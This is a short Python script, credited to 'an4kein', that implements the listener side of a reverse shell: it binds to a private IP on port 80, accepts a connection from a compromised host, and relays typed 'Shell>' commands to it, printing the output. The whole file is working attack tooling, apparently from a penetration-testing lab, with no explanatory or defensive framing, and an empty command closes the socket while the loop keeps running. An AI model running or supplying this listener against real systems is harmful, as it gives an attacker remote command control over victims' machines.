#!/usr/bin/python3
# Author: an4kein
import socket

def connect():
    s = socket.socket()
    s.bind(("192.168.196.135", 80))
    s.listen(1)
    conn , addr = s.accept()
    print("[+] we got a connection from", addr)

    while True:
        command = input("Shell> ")
        if command == '':
            try:
                conn.close()
            except:
                pass
            
        elif 'terminate' in command:
            try:
                print("[+] Closing connection")
                conn.send('terminate'.encode())
                conn.close()
                break
            except:
                pass
        
        else:
            try:
                conn.send(command.encode())
                print(conn.recv(1024).decode())
            except:
                pass              

def main():
    connect()
main()
